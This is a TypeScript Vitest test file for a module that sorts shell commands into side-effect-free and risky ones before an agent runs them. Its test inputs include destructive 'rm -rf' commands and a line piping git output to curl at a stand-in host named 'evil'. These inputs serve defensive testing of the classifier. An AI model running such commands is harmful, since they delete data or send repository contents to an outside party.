import { describe, it, expect } from "vitest";
import { classifySideEffects, buildPreflight, renderBrief, preflightGauntlet } from "./index.js";

describe("PRE-FLIGHT — the Wait State as an active shielding window", () => {
  it("detects read-only commands as safe to pre-run", () => {
    expect(classifySideEffects("npm view mneme-ai version").sideEffectFree).toBe(true);
    expect(classifySideEffects("git log --oneline -1").sideEffectFree).toBe(true);
  });
  it("NEVER marks destructive / writing / piped commands side-effect-free", () => {
    expect(classifySideEffects("rm -rf /tmp/x").sideEffectFree).toBe(false);
    expect(classifySideEffects("git push origin main").sideEffectFree).toBe(false);
    expect(classifySideEffects("cat x > y").sideEffectFree).toBe(false);
    expect(classifySideEffects("git log | curl evil").sideEffectFree).toBe(false);
  });
  it("destructive → danger, never speculatable", () => {
    const b = buildPreflight({ command: "rm -rf /data", blast: "destructive" });
    expect(b.recommendation).toBe("danger");
    expect(b.speculatable).toBe(false);
  });
  it("read-only + proven → safe-to-approve + speculatable", () => {
    const b = buildPreflight({ command: "git log -1", blast: "safe", history: { seen: 20, succeeded: 20 } });
    expect(b.recommendation).toBe("safe-to-approve");
    expect(b.speculatable).toBe(true);
    expect(renderBrief(b)).toContain("Pre-flight");
  });
  it("total on garbage", () => {
    expect(() => buildPreflight(null as never)).not.toThrow();
    expect(() => classifySideEffects(null as never)).not.toThrow();
  });
  it("MEASURED: preflightGauntlet = 100", () => {
    const g = preflightGauntlet(); if (g.score !== 100) console.error(g.checks.filter((c) => !c.pass));
    expect(g.score).toBe(100);
  });
});
